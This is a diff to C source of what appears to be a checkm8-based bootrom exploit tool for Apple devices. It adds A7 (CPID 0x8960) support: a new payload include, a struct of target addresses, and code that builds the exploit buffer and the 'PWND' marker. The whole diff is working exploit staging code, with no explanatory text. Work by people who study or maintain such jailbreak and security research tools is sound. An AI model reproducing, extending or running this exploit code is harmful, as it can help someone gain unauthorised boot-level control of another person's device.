@@ -140,10 +140,11 @@ typedef struct {
 	uint32_t sz;
 } transfer_ret_t;
 
-extern uint8_t payload_A9_bin[], payload_notA9_bin[], payload_notA9_armv7_bin[], payload_handle_checkm8_request_bin[], payload_handle_checkm8_request_armv7_bin[];
-extern unsigned payload_A9_bin_len, payload_notA9_bin_len, payload_notA9_armv7_bin_len, payload_handle_checkm8_request_bin_len, payload_handle_checkm8_request_armv7_bin_len;
+extern uint8_t payload_A9_bin[], payload_A7_bin[], payload_notA9_bin[], payload_notA9_armv7_bin[], payload_handle_checkm8_request_bin[], payload_handle_checkm8_request_armv7_bin[];
+extern unsigned payload_A9_bin_len, payload_A7_bin_len, payload_notA9_bin_len, payload_notA9_armv7_bin_len, payload_handle_checkm8_request_bin_len, payload_handle_checkm8_request_armv7_bin_len;
 
 #include "payload_A9.h"
+#include "payload_A7.h"
 #include "payload_notA9.h"
 #include "payload_notA9_armv7.h"
 #include "payload_handle_checkm8_request.h"
@@ -151,7 +152,7 @@ extern unsigned payload_A9_bin_len, payload_notA9_bin_len, payload_notA9_armv7_b
 
 static uint16_t cpid;
 static uint32_t payload_dest_armv7;
-static const char *pwnd_str = " PWND:[checkm8]";
+static const char *pwnd_str = " PWND:[gaster]";
 static der_item_spec_t der_img4_item_specs[] = {
 	{ 0, DER_IA5_STR, 0 },
 	{ 1, DER_SEQ, 0 }
@@ -1012,6 +1013,9 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 	} A9;
 	struct {
 		uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
+	} A7;
+	struct {
+		uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
 	} notA9;
 	struct {
 		uint32_t pwnd[4], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor;
@@ -1047,7 +1051,15 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			payload = NULL;
 			payload_sz = 0;
 		}
-	} else if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
+	} else if(cpid == 0x8960) {
+		if(payload_A7_bin_len > sizeof(A7)) {
+			payload = payload_A7_bin;
+			payload_sz = payload_A7_bin_len - sizeof(A7);
+		} else {
+			payload = NULL;
+			payload_sz = 0;
+		}
+	} else if(cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
 		if(payload_notA9_bin_len > sizeof(notA9)) {
 			payload = payload_notA9_bin;
 			payload_sz = payload_notA9_bin_len - sizeof(notA9);
@@ -1071,6 +1083,8 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 					data = calloc(1, payload_sz + sizeof(A9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
 				} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
 					data = calloc(1, DFU_MAX_TRANSFER_SZ + payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
+				} else if(cpid == 0x8960) {
+					data = calloc(1, payload_sz + sizeof(A7) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
 				} else {
 					data = calloc(1, payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
 				}
@@ -1132,7 +1146,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
 				memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
 				data_sz += sizeof(handle_checkm8_request);
-			} else if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
+			} else if(cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
 				memset(notA9.pwnd, '\0', sizeof(notA9.pwnd));
 				memcpy(notA9.pwnd, pwnd_str, strlen(pwnd_str));
 				notA9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
@@ -1150,6 +1164,32 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				}
 				memcpy(data + data_sz, &notA9, sizeof(notA9));
 				data_sz += sizeof(notA9);
+				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
+				data_sz += payload_handle_checkm8_request_sz;
+				handle_checkm8_request.handle_interface_request = handle_interface_request;
+				handle_checkm8_request.insecure_memory_base = insecure_memory_base;
+				handle_checkm8_request.exec_magic = EXEC_MAGIC;
+				handle_checkm8_request.done_magic = DONE_MAGIC;
+				handle_checkm8_request.memc_magic = MEMC_MAGIC;
+				handle_checkm8_request.memcpy_addr = memcpy_addr;
+				handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
+				memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
+				data_sz += sizeof(handle_checkm8_request);
+			} else if(cpid == 0x8960) {
+				memset(A7.pwnd, '\0', sizeof(A7.pwnd));
+				memcpy(A7.pwnd, pwnd_str, strlen(pwnd_str));
+				A7.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
+				A7.dfu_handle_bus_reset = dfu_handle_bus_reset;
+				A7.dfu_handle_request = dfu_handle_request;
+				A7.payload_off = payload_sz + sizeof(A7);
+				A7.payload_sz = payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request);
+				A7.memcpy_addr = memcpy_addr;
+				A7.gUSBSerialNumber = gUSBSerialNumber;
+				A7.usb_create_string_descriptor = usb_create_string_descriptor;
+				A7.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
+				A7.patch_addr = patch_addr;
+				memcpy(data + data_sz, &A7, sizeof(A7));
+				data_sz += sizeof(A7);
 				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
 				data_sz += payload_handle_checkm8_request_sz;
 				handle_checkm8_request.handle_interface_request = handle_interface_request;
@@ -1217,7 +1257,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				if(ret) {
 				if(cpid == 0x8011) {
 					// Do nothing, fixes A10X hopefully
-				} 
+				}
 				else {
 					send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, NULL);
 					send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, NULL);
